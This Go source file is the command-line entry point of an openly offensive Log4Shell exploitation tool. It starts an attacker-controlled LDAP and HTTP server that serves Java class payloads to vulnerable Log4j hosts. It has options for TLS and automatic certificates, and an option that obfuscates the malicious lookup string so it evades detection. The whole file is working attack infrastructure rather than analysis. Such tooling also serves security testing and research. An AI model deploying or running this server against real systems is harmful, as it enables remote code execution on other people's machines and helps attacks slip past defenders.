package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"

	"github.com/For-ACGN/Log4Shell"
)

var (
	cfg log4shell.Config
	crt string
	key string
	obf string
)

func init() {
	banner()

	flag.CommandLine.SetOutput(os.Stdout)
	flag.StringVar(&cfg.Hostname, "host", "127.0.0.1", "server IP address or domain name")
	flag.StringVar(&cfg.PayloadDir, "payload", "payload", "payload(java class) directory")
	flag.StringVar(&cfg.HTTPNetwork, "http-net", "tcp", "http server network")
	flag.StringVar(&cfg.HTTPAddress, "http-addr", ":8080", "http server address")
	flag.StringVar(&cfg.LDAPNetwork, "ldap-net", "tcp", "ldap server network")
	flag.StringVar(&cfg.LDAPAddress, "ldap-addr", ":3890", "ldap server address")
	flag.BoolVar(&cfg.AutoCert, "auto-cert", false, "use ACME client to sign certificate")
	flag.BoolVar(&cfg.EnableTLS, "tls-server", false, "enable ldaps and https server")
	flag.StringVar(&crt, "tls-cert", "cert.pem", "tls certificate file path")
	flag.StringVar(&key, "tls-key", "key.pem", "tls private key file path")
	flag.StringVar(&obf, "obf", "", "obfuscate malicious(payload) string")
	flag.Parse()
}

func banner() {
	fmt.Println()
	fmt.Println("  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::     ")
	fmt.Println("  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:     ")
	fmt.Println("  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+     ")
	fmt.Println("  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+     ")
	fmt.Println("  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+     ")
	fmt.Println("  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#     ")
	fmt.Println("  ######## ########   ########        ###   ########  ###    ### ########## ######## ########")
	fmt.Println()
	fmt.Println("                                                        https://github.com/For-ACGN/Log4Shell")
	fmt.Println()
}

func main() {
	// output obfuscated string
	if obf != "" {
		fmt.Printf("raw: %s\n\n%s\n", obf, log4shell.Obfuscate(obf))
		return
	}

	// load tls certificate
	if cfg.EnableTLS {
		cert, err := tls.LoadX509KeyPair(crt, key)
		checkError(err)
		cfg.TLSCert = cert
	}
	cfg.Logger = os.Stdout

	// start log4shell server
	server, err := log4shell.New(&cfg)
	checkError(err)
	err = server.Start()
	checkError(err)

	// wait signal for stop log4shell server
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	<-signalCh

	err = server.Stop()
	checkError(err)
}

func checkError(err error) {
	if err != nil {
		log.Fatalln("[error]", err)
	}
}
